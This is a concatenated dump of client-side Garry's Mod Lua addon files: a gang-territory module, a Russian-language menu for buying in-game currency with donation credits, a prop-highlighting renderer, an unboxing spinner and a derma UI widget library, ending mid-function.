        end
    end

    hook.Run( "BRS.Hooks.RefreshGangTerritories" )
end )

function BRICKS_SERVER.Func.RequestTerritoryGangs()
    if( CurTime() < (BRS_REQUEST_TERRITORYGANG_COOLDOWN or 0) ) then return end

    BRS_REQUEST_TERRITORYGANG_COOLDOWN = CurTime()+10

    net.Start( "BRS.Net.RequestTerritoryGangs" )
    net.SendToServer()
end

function BRICKS_SERVER.Func.RequestTerritoryIconMat( territoryKey )
    if( CurTime() < (BRS_REQUEST_TERRITORYICONMAT_COOLDOWN or 0) ) then return end

    BRS_REQUEST_TERRITORYICONMAT_COOLDOWN = CurTime()+10
    local gangID = (BRS_GANG_TERRITORIES[territoryKey] or {}).GangID
    local iconURL = (BRICKS_SERVER_GANGNAMES[gangID] or {}).Icon
    if( not iconURL or not BRICKS_SERVER.Func.CheckGangIconURL( iconURL ) ) then return end

    if( not string.StartWith( iconURL, "http" ) ) then
        BRS_GANG_TERRITORIES[territoryKey].IconMat = Material( iconURL, "noclamp smooth" )
    end

    BRICKS_SERVER.Func.GetImage( iconURL, function( mat ) 
        BRS_GANG_TERRITORIES[territoryKey].IconMat = mat 
    end )
end
--PATH addons/donate3/lua/autorun/client/cl_buymoney.lua:
local function SendBytMoney(mon)
	net.Start("BuyMoney")
		net.WriteInt(mon, 32)
	net.SendToServer()
end
local PANEL = {}
local function CheckLetter(String)
    local TableLetters = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}
    local Accept = false 
    for k, v in pairs(TableLetters) do 
        if v == string.upper(String) then 
            Accept = true 
        end 
    end 
    return Accept 
end 
function PANEL:Init()
    self.MaxValue = 100
	self.MinValue = 60

    self.ButtonContainer = vgui.Create('DPanel', self)
    self.ButtonContainer.Paint = function()
    end

    self.Button = vgui.Create('DButton', self.ButtonContainer)
    self.Button.OnMousePressed = function(s, mb)
        if (mb == MOUSE_LEFT) then
            self:StartDrag()
        end
    end
    self.Button:SetText('')
    self.Button.Paint = function(self, w, h)
        draw.RoundedBox(10, 0, 0, w, h, Color(254, 182, 41))
    end
    self:SetValue(self.MaxValue / 2)
end

function PANEL:PerformLayout()
    self:SetTall(height(28))
    self.ButtonContainer:SetPos(0, height(9))
    self.ButtonContainer:SetSize(self:GetWide(), self:GetTall())
    self.Button:SetSize(weight(10), height(10))
    self.Button:SetPos(self.Value / self.MaxValue * (self.ButtonContainer:GetWide() - 20), 0)
end

function PANEL:Paint(w, h)
    draw.RoundedBox(0, weight(7), height(13), w, height(2), Color(255, 255, 255, 20))
end

function PANEL:Think()
    if (self.Dragging) then
        local mx, my = self:CursorPos()

        mx = math.Clamp(mx - self.OffX, 0, self.ButtonContainer:GetWide() - 20)
        if (self.Button.x ~= mx) then
            self:SetValue(mx / (self.ButtonContainer:GetWide() - 20) * self.MaxValue)
            self:OnChange(self.Value)
        end
        if (not input.IsMouseDown(MOUSE_LEFT)) then
            self:EndDrag()
        end
    end
end

function PANEL:StartDrag()
    self.Dragging = true
    self.OffX = self.Button:CursorPos()
end

function PANEL:EndDrag()
    self.Dragging = false
    self:OnMouseReleased(self.Value)
end

function PANEL:OnMouseReleased(val)
end

function PANEL:OnChange(val)
end

function PANEL:SetValue(val)
    self.Value = val
    self.Button:SetPos(val / self.MaxValue * (self.ButtonContainer:GetWide()-weight(10)), 0)
end

function PANEL:GetValue()
    return self.Value / self.MaxValue
end

vgui.Register('dslider', PANEL, 'Panel')

local MoneyPrice = 4600
local w,h = ScrW(),ScrH()
local blur = Material("pp/blurscreen")	

local function blurpanel(panel, amount)
        local x, y = panel:LocalToScreen(0, 0)
        local scrW, scrH = ScrW(), ScrH()
        surface.SetDrawColor(255, 255, 255)
        surface.SetMaterial(blur)
        for i = 1, 3 do
            blur:SetFloat("$blur", (i / 3) * (amount or 6))
            blur:Recompute()
            render.UpdateScreenEffectTexture()
            surface.DrawTexturedRect(x * -1, y * -1, scrW, scrH)
        end
end
function Donate_OpenMoneyBuyMenu()
	local x = 1
	local frame = vgui.Create('DFrame')
	frame:SetSize(w,h)
	frame:MakePopup()
	frame:SetTitle('')
	frame:ShowCloseButton(false)
    frame:SetDraggable(false)
	frame.Paint = function(self,w,h)
		blurpanel(self,10)
		draw.RoundedBox(0,0,0,w,h,Color(0,0,0,150))
	end

	local mainPanel = vgui.Create('DPanel',frame)
	mainPanel:SetSize(weight(359),height(314))
	mainPanel:Center()
	mainPanel.Paint = function(self,w,h)
		draw.RoundedBox(16,0,0,w,h,Color(45,45,45,253))
		draw.SimpleText('Покупка игровой валюты','MSB_16',w/2,height(9),Color(255,255,255),1,0)
		draw.SimpleText('Крутите ползунок','MM_16',weight(14),height(53))
		draw.SimpleText('ИЛИ','MM_16',w/2,height(123),Color(255,255,255),1,0)
		draw.SimpleText('Введите сумму донат денег','MM_16',weight(14),height(148))
	end
	
	local close = vgui.Create('DButton', mainPanel)
    close:SetSize( weight(20), height(20) )
    close:SetPos( mainPanel:GetWide() - weight(30), height(9) )
    close:SetText('')
    close.Paint = function(self, w,h)
        local color = Color(255,255,255)
        if self.Hovered then
            color = Color(255,255,255,125)
        end

        draw.SimpleText( '✕', 'MM_20', w/2, h/2, color, 1, 1)
    end
    close.DoClick = function(self,w,h)
        frame:Remove()
    end

    local ok = vgui.Create("DButton",mainPanel)
	ok:SetText('Крутите ползунок или введите сумму')
	ok:SetFont('MM_16')
	ok:SetTextColor(Color(255,255,255))
	ok:SetSize(weight(331),height(60))
	ok:SetPos(weight(14),height(237))
    ok.alpha = 0
	ok.Paint = function(self,w,h)
        if self:IsHovered() then
            self.alpha = Lerp(FrameTime()*10,self.alpha,0.7)
        else
            self.alpha = Lerp(FrameTime()*7,self.alpha,1)
        end
		draw.RoundedBox(5,0,0,w,h,Color(22,165,96,255*self.alpha))
	end
	ok.DoClick = function()
		SendBytMoney(x)
	end

	local slider = vgui.Create('dslider', mainPanel)
	slider:SetPos(weight(13), height(92))
	slider:SetSize(weight(331),height(11))
	slider.OnChange = function(self, val)
		val = math.floor(val)
		x = val

		txt = "Купить "..DarkRP.formatMoney(val*MoneyPrice).." за "..val.." кредитов."
 		ok:SetText(txt)
	end
	slider:SetValue(0)

	local header = vgui.Create('DTextEntry',mainPanel)
	header:SetSize(weight(331),height(45))
	header:SetPos(weight(14),height(177))
	header:SetValue('Сумма')
	header:SetDrawLanguageID(false)
	header:SetFont('MM_16')
	function header:OnMousePressed() 
		header:SetValue("")
	end
	header.AllowInput = function(self, stringValue)
		if not CheckLetter(stringValue) then 
			return true
		end
	end 
	header.Paint = function(self,w,h)
		draw.RoundedBox(5,0,0,w,h,Color(38,37,37))
		self:DrawTextEntryText(Color(255,255,255,104), Color(121,121,121), color_white)
	end
	header.OnChange = function(self)
		val = math.floor(self:GetValue())
		x = val

		txt = "Купить "..DarkRP.formatMoney(val*MoneyPrice).." за "..val.." кредитов."
		ok:SetText(txt)
	end
end

concommand.Add("ff",function()
	Donate_OpenMoneyBuyMenu()
end)
--PATH addons/perma/lua/permaprops/cl_drawent.lua:
/*
   ____          _          _   ____          __  __       _ _                     
  / ___|___   __| | ___  __| | | __ ) _   _  |  \/  | __ _| | |__   ___  _ __ ___  
 | |   / _ \ / _` |/ _ \/ _` | |  _ \| | | | | |\/| |/ _` | | '_ \ / _ \| '__/ _ \ 
 | |__| (_) | (_| |  __/ (_| | | |_) | |_| | | |  | | (_| | | |_) | (_) | | | (_) |
  \____\___/ \__,_|\___|\__,_| |____/ \__, | |_|  |_|\__,_|_|_.__/ \___/|_|  \___/ 
                                      |___/                                        
*/

local function PermaPropsViewer()

	if not LocalPlayer().DrawPPEnt or not istable(LocalPlayer().DrawPPEnt) then return end

    local pos = LocalPlayer():EyePos() + LocalPlayer():EyeAngles():Forward() * 10
    local ang = LocalPlayer():EyeAngles()

    ang = Angle(ang.p + 90, ang.y, 0)

    for k, v in pairs(LocalPlayer().DrawPPEnt) do

    	if not v or not v:IsValid() then LocalPlayer().DrawPPEnt[k] = nil continue end

	    render.ClearStencil()
	    render.SetStencilEnable(true)
	        render.SetStencilWriteMask(255)
	        render.SetStencilTestMask(255)
	        render.SetStencilReferenceValue(15)
	        render.SetStencilFailOperation(STENCILOPERATION_REPLACE)
	        render.SetStencilZFailOperation(STENCILOPERATION_REPLACE)
	        render.SetStencilPassOperation(STENCILOPERATION_KEEP)
	        render.SetStencilCompareFunction(STENCILCOMPARISONFUNCTION_ALWAYS)
	        render.SetBlend(0)
	        v:DrawModel()
	        render.SetBlend(1)
	        render.SetStencilCompareFunction(STENCILCOMPARISONFUNCTION_EQUAL)
	        cam.Start3D2D(pos, ang, 1)
	                surface.SetDrawColor(255, 0, 0, 255)
	                surface.DrawRect(-ScrW(), -ScrH(), ScrW() * 2, ScrH() * 2)
	        cam.End3D2D()
	        v:DrawModel()
	    render.SetStencilEnable(false)

	end

end
hook.Add("PostDrawOpaqueRenderables", "PermaPropsViewer", PermaPropsViewer)
--PATH addons/unbox/lua/unbox/spinner.lua:
if debug.getinfo(1).short_src == "<spinner.lua>" then
    include("autorun/client/cl_unboxing_2.lua")

    return
end

local ModelPanel = (...).ModelPanel
local generateTape = (...).generateTape
local frameColor = (...).frameColor
local gradientL = Material("vgui/gradient-l.vmt", "smooth noclamp")
local gradientR = Material("vgui/gradient-r.vmt", "smooth noclamp")
local lastTick = 0

local function PlayTick()
    if lastTick > CurTime() - 0.05 then return end
    lastTick = CurTime()
    LocalPlayer():EmitSound("ub_tick.wav")
end

return {
    Base = "DHorizontalScroller",
    Init = function(self)
        self:SetOverlap(-6)
        self:SetShowDropTargets(false)
        self.btnRight.Paint = nil
        self.btnLeft.Paint = nil
        self:SetMouseInputEnabled(false)
        self.OnMouseWheeled = nil
        self.Finished = true
    end,
    SetID = function(self, id)
        self.ID = id
        self:SetScroll(0)
        self:GenerateTape()
    end,
    GenerateTape = function(self)
        self.Items = {}
        local tape = generateTape(self.ID)

        for k, id in pairs(tape) do
            local p = vgui.CreateFromTable(ModelPanel)
            p:SetWide(100)
            p:Set(id)
            self.Items[k] = p
            self:AddPanel(p)
        end
    end,
    ScrollTo = function(self, panel)
        self:InvalidateLayout(true)
        local x, y = self.pnlCanvas:GetChildPosition(panel)
        local w, h = panel:GetSize()
        x = x + w * 0.5
        x = x - self:GetWide() / 2 + math.random(-w * 0.5 + 3, w * 0.5 - 2)
        self.ResultScroll = x
    end,
    Think = function(self)
        if self.Finished then return end
        local scroll = self.OffsetX

        if self.ResultScroll - scroll < 1 then
            self.Finished = true

            if self.OnFinish then
                self:OnFinish()
            end
        else
            local num = (scroll / (100))
            local float = num % 1

            if float > 0.6 and float < 0.7 then
                local int = math.floor(num)

                if self.LastSound ~= int then
                    self.LastSound = int
                    PlayTick()
                end
            end

            self:SetScroll(Lerp(0.01, scroll, self.ResultScroll))
        end
    end,
    OnFinish = function(self) end,
    --print("finished!")
    PaintOver = function(self, w, h)
        draw.RoundedBox(0, w / 2 - 1, 0, 2, h, Color(255, 140, 0, 150))
        surface.SetDrawColor(frameColor)
        local size = w / 6

        -- make it darker
        for i = 1, 4 do
            surface.SetMaterial(gradientL)
            surface.DrawTexturedRect(0, 0, size, h)
            surface.SetMaterial(gradientR)
            surface.DrawTexturedRect(w - size + 1, 0, size, h)
        end
    end,
    DoSpin = function(self, winID)
        local slotID = math.floor(table.Count(self.Items) * .75)
        local panel = self.Items[slotID]
        if not panel or not IsValid(panel) then return end
        panel:Set(winID)
        self.tim = 0
        self.Finished = false
        self:ScrollTo(panel)
    end
}
--PATH addons/donate3/lua/autorun/client/cl_weapons.lua:

-----------------------------------------------------
--[[

	LICENSE

	https://creativecommons.org/licenses/by-nc-nd/4.0/

	Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)

]]

--////////////////////////////////////////////////////////////////////////--

-- local version = 1
-- if (BVGUI) then
	-- if (BVGUI.Version >= version) then
		-- print("return")
		-- return
	-- end
-- end
-- BVGUI = {}
-- BVGUI.Version = version

surface.CreateFont("BVGUI_roboto16",{
	size = 16,
	font = "Roboto",
})
surface.CreateFont("BVGUI_roboto16_i",{
	size = 16,
	font = "Roboto",
	italic = true,
})

BVGUI_Tooltips = BVGUI_Tooltips or {}

local function OnCursorEntered_Tooltip(self)
	if (self.Tooltip == "" or self.Tooltip == nil) then return end
	self.TooltipGUI = vgui.Create("DLabel")
	table.insert(BVGUI_Tooltips,self.TooltipGUI)
	self.TooltipGUI:SetDrawOnTop(true)
	self.TooltipGUI:SetTextColor(Color(255,255,255))
	self.TooltipGUI:SetFont("BVGUI_roboto16")
	self.TooltipGUI:SetDrawBackground(true)
	self.TooltipGUI:SetContentAlignment(7)
	self.TooltipGUI:SetText(self.Tooltip)
	self.TooltipGUI:SetWide(200)
	self.TooltipGUI:SetTall(ScrH())
	self.TooltipGUI:SetWrap(true)
	self.TooltipGUI.NoPaint = true
	local x,y = gui.MousePos()
	self.TooltipGUI:SetPos(x - (self.TooltipGUI:GetWide() / 2),y + 35)
	function self.TooltipGUI:Paint(w,h)
		self:SizeToContentsX()
		if (w > 200) then
			self:SetWide(200)
		end
		self:SizeToContentsY()
		if (not self.NoPaint) then
			surface.DisableClipping(true)
			surface.SetDrawColor(0,0,0,250)
			surface.DrawRect(-5,-5,w + 10,h + 10)
		end
		self.NoPaint = false
	end
end

local function OnCursorExited_Tooltip(self)
	if (IsValid(self.TooltipGUI)) then
		self.TooltipGUI:Remove()
	end
	for _,v in pairs(BVGUI_Tooltips) do
		v:Remove()
	end
end

local function OnCursorMoved_Tooltip(self)
	if (IsValid(self.TooltipGUI)) then
		local x,y = gui.MousePos()
		self.TooltipGUI:SizeToContentsY()
		self.TooltipGUI:SetPos(x - (self.TooltipGUI:GetWide() / 2),y + 35)
	end
end

local function SetTooltip(self,tt)
	self.Tooltip = tt
	if (IsValid(self.TooltipGUI)) then
		self.TooltipGUI:SetText(self.Tooltip)
	end
	if (tt == "") then
		if (IsValid(self.TooltipGUI)) then
			self.TooltipGUI:Remove()
		end
	end
end

--////////////////////////////////////////////////////////////////////////--

local PANEL = {}

function PANEL:SetTooltip(tt)
	SetTooltip(self,tt)
end
function PANEL:OnCursorEntered()
	OnCursorEntered_Tooltip(self)
end
function PANEL:OnCursorExited()
	OnCursorExited_Tooltip(self)
end
function PANEL:OnCursorMoved()
	OnCursorMoved_Tooltip(self)
end

derma.DefineControl("BImageButton",nil,PANEL,"DImageButton")

--////////////////////////////////////////////////////////////////////////--

local PANEL = {}

function PANEL:Init()
	self:SetTextColor(Color(255,255,255))
	self:SetFont("BVGUI_roboto16")
end

function PANEL:SetTooltip(tt)
	SetTooltip(self,tt)
end
function PANEL:OnCursorEntered()
	OnCursorEntered_Tooltip(self)
end
function PANEL:OnCursorExited()
	OnCursorExited_Tooltip(self)
end
function PANEL:OnCursorMoved()
	OnCursorMoved_Tooltip(self)
end

function PANEL:Paint()
	if (self:GetDisabled() ~= false) then
		surface.SetDrawColor(Color(26,26,26))
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	else
		if (self:IsHovered() and input.IsMouseDown(MOUSE_LEFT)) then
			surface.SetDrawColor(Color(96,168,255))
		elseif (self:IsHovered()) then
			surface.SetDrawColor(Color(38,103,183))
		else
			surface.SetDrawColor(Color(52,139,249))
		end
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
		surface.SetDrawColor(Color(26,26,26))
		surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
	end
end

derma.DefineControl("BButton",nil,PANEL,"DButton")

--////////////////////////////////////////////////////////////////////////--

local PANEL = {}

function PANEL:SetTooltip(tt)
	SetTooltip(self,tt)
end
function PANEL:OnCursorEntered()
	OnCursorEntered_Tooltip(self)
end
function PANEL:OnCursorExited()
	OnCursorExited_Tooltip(self)
end
function PANEL:OnCursorMoved()
	OnCursorMoved_Tooltip(self)
end

derma.DefineControl("BImageButton",nil,PANEL,"DImageButton")

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function PANEL:Paint()
	surface.SetDrawColor(Color(26,26,26))
	surface.DrawRect(0,0,self:GetWide(),self:GetTall())
end

function PANEL:Init()
	self.VBar.btnUp:SetText("-")
	self.VBar.btnUp:SetFont("BVGUI_roboto16")
	self.VBar.btnUp:SetTextColor(Color(255,255,255))
	self.VBar.btnUp.Paint = function(self)
		surface.SetDrawColor(Color(0,0,0))
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end

	self.VBar.btnDown:SetText("-")
	self.VBar.btnDown:SetFont("BVGUI_roboto16")
	self.VBar.btnDown:SetTextColor(Color(255,255,255))
	self.VBar.btnDown.Paint = function(self)
		surface.SetDrawColor(Color(0,0,0))
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end

	self.VBar.btnGrip:SetCursor("hand")
	self.VBar.btnGrip.Paint = function(self)
		surface.SetDrawColor(Color(50,50,50))
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end

	self.VBar.Paint = function(self)
		surface.SetDrawColor(Color(0,0,0))
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end
end

derma.DefineControl("BScrollPanel",nil,PANEL,"DScrollPanel")

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function PANEL:Paint()
	surface.SetDrawColor(Color(26,26,26))
	surface.DrawRect(0,0,self:GetWide(),self:GetTall())
end

function PANEL:Init()
	self.VBar.btnUp:SetText("-")
	self.VBar.btnUp:SetFont("BVGUI_roboto16")
	self.VBar.btnUp:SetTextColor(Color(255,255,255))
	self.VBar.btnUp.Paint = function(self)
		surface.SetDrawColor(Color(0,0,0))
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end

	self.VBar.btnDown:SetText("-")
	self.VBar.btnDown:SetFont("BVGUI_roboto16")
	self.VBar.btnDown:SetTextColor(Color(255,255,255))
	self.VBar.btnDown.Paint = function(self)
		surface.SetDrawColor(Color(0,0,0))
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end

	self.VBar.btnGrip:SetCursor("hand")
	self.VBar.btnGrip.Paint = function(self)
		surface.SetDrawColor(Color(50,50,50))
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end

	self.VBar.Paint = function(self)
		surface.SetDrawColor(Color(0,0,0))
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end

	self.Container = vgui.Create("DPanel",self)
	self.Container.Paint = function() end

	self.Items = {}
end

function PANEL:NewItem(name,color,f,force_toggle)

	local this = self

	local new = vgui.Create("DPanel",self.Container)
	new:SetCursor("hand")
	new:SetSize(self.Container:GetWide(),30)
	table.insert(self.Items,new)
	new:AlignLeft(0)
	new.Paint = function() end

	new.borderLeft = vgui.Create("DPanel",new)
	new.borderLeft:SetSize(5,new:GetTall())
	new.borderLeft:AlignTop(0)
	new.borderLeft:AlignLeft(0)
	new.borderLeft.Paint = function()
		surface.SetDrawColor(color or Color(26,26,26))
		surface.DrawRect(0,0,new.borderLeft:GetWide(),new.borderLeft:GetTall())
	end

	new.text = vgui.Create("DLabel",new)
	new.text:SetTextColor(Color(255,255,255))
	new.text:SetFont("BVGUI_roboto16")
	new.text:SetText(name)
	new.text:SizeToContents()
	new.text:AlignLeft(10)
	new.text:CenterVertical()

	function new:OnCursorEntered()
		if (new.Toggled) then return end
		new.borderLeft:SetWide(7)
		new.text:AlignLeft(13)
	end

	function new:OnCursorExited()
		if (new.Toggled) then return end
		new.borderLeft:SetWide(5)
		new.text:AlignLeft(10)
	end

	function new:OnMousePressed()
		f(name,color,new)
		if (force_toggle) then
			for _,v in pairs(this.Items) do
				if (v.borderLeft and v.Toggled) then
					v.Toggled = false
					v.borderLeft:Stop()
					v.borderLeft:SizeTo(5,v.borderLeft:GetTall(),0.25)
					v.text:AlignLeft(10)
				end
			end
			new.Toggled = true
			new.borderLeft:Stop()
			new.borderLeft:SizeTo(new:GetWide(),new.borderLeft:GetTall(),0.25)
			new.text:AlignLeft(13)
		end
	end
	function new.borderLeft:OnMousePressed() new:OnMousePressed() end
	function new.text:OnMousePressed() new:OnMousePressed() end

	self:FixLayout()

	return new
end

function PANEL:NewCategory(name,color)

	local new = vgui.Create("DPanel",self.Container)
	new:SetSize(self.Container:GetWide(),30)
	new:AlignTop(#self.Items * 30)
	table.insert(self.Items,new)
	new:AlignLeft(0)
	new.Paint = function()
		surface.SetDrawColor(color or Color(26,26,26))
		surface.DrawRect(0,0,new:GetWide(),new:GetTall())
	end

	new.text = vgui.Create("DLabel",new)
	if (color.r >= 160 and color.g >= 160 and color.b >= 160) then
		new.text:SetTextColor(Color(0,0,0))
	else
		new.text:SetTextColor(Color(255,255,255))
	end
	new.text:SetFont("BVGUI_roboto16")
	new.text:SetText(name)
	new.text:SizeToContents()
	new.text:Center()

	self:FixLayout()
end

function PANEL:FixLayout()
	self.Container:SetSize(self:GetWide(),0)
	local s = 0
	for i,v in pairs(self.Items) do
		local t = self.Container:GetTall()
		self.Container:SetSize(self:GetWide(),t + v:GetTall())
		if (i == 1) then
			v:AlignTop(0)
			s = v:GetTall()
		else
			v:AlignTop(t + v:GetTall() - s)
		end
		v:SetWide(self.Container:GetWide())
		v.text:SetWide(self.Container:GetWide() - 15)
		v.text:AlignLeft(10)
	end
end

function PANEL:Clear()
	for _,v in pairs(self.Items) do
		v:Remove()
	end
	self.Items = {}
end

derma.DefineControl("BCategories",nil,PANEL,"DScrollPanel")

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function PANEL:Init()
	self:GetParent().btnClose:SetVisible(false)
	self:GetParent().btnMaxim:SetVisible(false)
	self:GetParent().btnMinim:SetVisible(false)

	self.Paint = function() end
	self:SetSize(18,18)
	self:SetText("X")
	self:SetFont("BVGUI_roboto16")
	self:SetTextColor(Color(255,255,255))
	self:AlignRight(2)
	self:AlignTop(2)
	self.DoClick = function()
		if (self:GetParent().CloseButtonClicked) then
			self:GetParent().CloseButtonClicked()
		end
		self:GetParent():Close()
	end
end

function PANEL:ShowCloseButton(shouldshow)
	self:SetVisible(shouldshow)
end

derma.DefineControl("BCloseButton",nil,PANEL,"DButton")

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function PANEL:Init()
	self.ShowTitleBar = true
	self.BackgroundColor = Color(242,242,242)

	self:DockPadding(1,24,1,1)

	self.lblTitle:SetTextColor(Color(255,255,255))
	self.lblTitle:SetFont("BVGUI_roboto16")
	self.lblTitle:SetPos(5,5)

	self.Paint = function(self)
		surface.SetDrawColor(self.BackgroundColor)
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())

		if (self.ShowTitleBar ~= false) then
			surface.SetDrawColor(Color(26,26,26))
			surface.DrawRect(0,0,self:GetWide(),24)

			surface.SetDrawColor(Color(26,26,26))
			surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
		end
	end
end

function PANEL:ShowCloseButton(shouldshow)
	self.CloseButton:ShowCloseButton(shouldshow)
end

function PANEL:Configured()
	local x,y = self:GetPos()
	self:SetPos(x,ScrH())
	self:MoveTo(x,y,0.5)

	self.CloseButton = vgui.Create("BCloseButton",self)
end

function PANEL:Paint()
	surface.SetDrawColor(Color(26,26,26))
	surface.DrawRect(0,0,self:GetWide(),self:GetTall())
end

function PANEL:Close()
	self:SetMouseInputEnabled(false)
	self:SetKeyboardInputEnabled(false)
	local x = self:GetPos()
	self:Stop()
	self:MoveTo(x,ScrH(),0.5,0,-1,function()
		self:Remove()
	end)

	if (self.OnClose ~= nil) then
		self.OnClose()
	end
end

function PANEL:ShouldShowTitleBar(shouldshow)
	PANEL.ShowTitleBar = tobool(shouldshow) or true
end
function PANEL:SetBackgroundColor(bgcolor)
	PANEL.ShowTitleBar = tobool(shouldshow) or true
end

derma.DefineControl("BFrame",nil,PANEL,"DFrame")

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function PANEL:Init()
	self:SetTextColor(Color(0,0,0))
	self:SetFont("BVGUI_roboto16")
end

function PANEL:White()
	self:SetTextColor(Color(255,255,255))
end

derma.DefineControl("BLabel",nil,PANEL,"DLabel")

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function PANEL:Init()
	self.DrawOutline = false

	self.Header:SetFont("BVGUI_roboto16")
	self.Header:SetTextColor(Color(0,0,0))
	function self.Header:OnMousePressed() end

	if (IsValid(self.DraggerBar)) then
		self.DraggerBar:SetVisible(false)
	end

	self.Header.Paint = function(self)
		local bg = Color(242,242,242)

		if (self:IsHovered()) then
			bg = Color(232,232,232)
		end

		surface.SetDrawColor(bg)
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())

		surface.SetDrawColor(Color(206,206,206))
		surface.DrawRect(0,self:GetTall() - 1,self:GetWide(),1)


	end
end

function PANEL:DrawOutline(shoulddraw)
	self.DrawOutline = shoulddraw
end

derma.DefineControl("BListView_Column",nil,PANEL,"DListView_Column")

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function PANEL:Init()
	for _,v in pairs(self.Columns) do
		v:SetTextColor(Color(0,0,0))
		v:SetFont("BVGUI_roboto16")

		v.PaintOver = function(self)
			surface.SetDrawColor(Color(219,219,219))
			surface.DrawRect(0,0,1,self:GetTall())
		end
	end
	if (self.ColorMode == false) then
		self.Paint = function(self)
			if (self:IsLineSelected()) then
				surface.SetDrawColor(Color(26,26,26))
				surface.DrawRect(0,0,self:GetWide(),self:GetTall())
				return
			end

			local bg = Color(255,255,255)

			if (self:IsHovered()) then
				bg = Color(245,245,245)
			end

			surface.SetDrawColor(bg)
			surface.DrawRect(0,0,self:GetWide(),self:GetTall())

			surface.SetDrawColor(Color(219,219,219))
			surface.DrawRect(1,self:GetTall() - 1,self:GetWide() - 2,1)
		end
	else
		self.Paint = function(self)
			if (self:IsLineSelected()) then
				surface.SetDrawColor(Color(26,26,26))
				surface.DrawRect(0,0,self:GetWide(),self:GetTall())
				return
			end

			local bg = Color(245,245,245)

			if (self:IsHovered()) then
				bg = Color(235,235,235)
			end

			surface.SetDrawColor(bg)
			surface.DrawRect(0,0,self:GetWide(),self:GetTall())

			surface.SetDrawColor(Color(219,219,219))
			surface.DrawRect(1,self:GetTall() - 1,self:GetWide() - 2,1)
		end
	end
	self.ColorMode = not self.ColorMode
end
function PANEL:OnMousePressed(mcode)
	if (mcode == MOUSE_RIGHT) then
		self:GetListView():OnRowRightClick(self:GetID(),self)
		self:OnRightClick()
		return
	end
	self:GetListView():OnClickLine(self,true)
	self:OnSelect()
end

derma.DefineControl("BListView_Line",nil,PANEL,"DListView_Line")

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function PANEL:Init()
	self.Paint = function(self)
		surface.SetDrawColor(Color(255,255,255))
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
		surface.SetDrawColor(Color(207,207,207))
		surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
	end
	self:SetHeaderHeight(35)
	self:SetDataHeight(25)
	self.ColorMode = false

	self.VBar.btnUp:SetText("-")
	self.VBar.btnUp:SetFont("BVGUI_roboto16")
	self.VBar.btnUp:SetTextColor(Color(255,255,255))
	self.VBar.btnUp.Paint = function(self)
		surface.SetDrawColor(Color(0,0,0))
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end

	self.VBar.btnDown:SetText("-")
	self.VBar.btnDown:SetFont("BVGUI_roboto16")
	self.VBar.btnDown:SetTextColor(Color(255,255,255))
	self.VBar.btnDown.Paint = function(self)
		surface.SetDrawColor(Color(0,0,0))
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end

	self.VBar.btnGrip:SetCursor("hand")
	self.VBar.btnGrip.Paint = function(self)
		surface.SetDrawColor(Color(50,50,50))
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end

	self.VBar.Paint = function(self)
		surface.SetDrawColor(Color(0,0,0))
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end
end

function PANEL:Clear()
	self.ColorMode = false

	for a,b in pairs(self.Lines)do b:Remove()end;self.Lines={}self.Sorted={}self:SetDirty(true)
end

function PANEL:AddColumn(a,b)local c=nil;if self.m_bSortable then c=vgui.Create("BListView_Column",self)else c=vgui.Create("DListView_ColumnPlain",self)end;c:SetName(a)c:SetZPos(10)if b then table.insert(self.Columns,b,c)for d=1,#self.Columns do self.Columns[d]:SetColumnID(d)end else local e=table.insert(self.Columns,c)c:SetColumnID(e)end;self:InvalidateLayout()return c end
function PANEL:AddLine(...)self:SetDirty(true)self:InvalidateLayout()local a=vgui.Create("BListView_Line",self.pnlCanvas)local b=table.insert(self.Lines,a)a:SetListView(self)a:SetID(b)for c,d in pairs(self.Columns)do a:SetColumnText(c,"")end;for c,d in pairs({...})do a:SetColumnText(c,d)end;local e=table.insert(self.Sorted,a)if e%2==1 then a:SetAltLine(true)end;for f,g in pairs(a.Columns)do g:SetFont("BVGUI_roboto16")end;return a end

derma.DefineControl("BListView",nil,PANEL,"DListView")

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function Billy_Message(strText,strTitle,strButtonText)

	local Window = vgui.Create("BFrame")
	Window:SetTitle(strTitle or "Message")
	Window:SetDraggable(false)
	Window:SetBackgroundBlur(true)
	Window:SetDrawOnTop(true)

	local InnerPanel = vgui.Create("Panel",Window)

	local Text = vgui.Create("DLabel",InnerPanel)
	Text:SetFont("BVGUI_roboto16")
	Text:SetText(strText or "Message Text")
	Text:SizeToContents()
	Text:SetContentAlignment(5)
	Text:SetTextColor(Color(0,0,0))

	local ButtonPanel = vgui.Create("DPanel",Window)
	ButtonPanel:SetTall(30)
	ButtonPanel:SetDrawBackground(false)

	local Button = vgui.Create("BButton",ButtonPanel)
	Button:SetText(strButtonText or "OK")
	Button:SizeToContents()
	Button:SetTall(20)
	Button:SetWide(Button:GetWide() + 20)
	Button:SetPos(5,5)
	Button.DoClick = function() Window:Close() end

	ButtonPanel:SetWide(Button:GetWide() + 10)

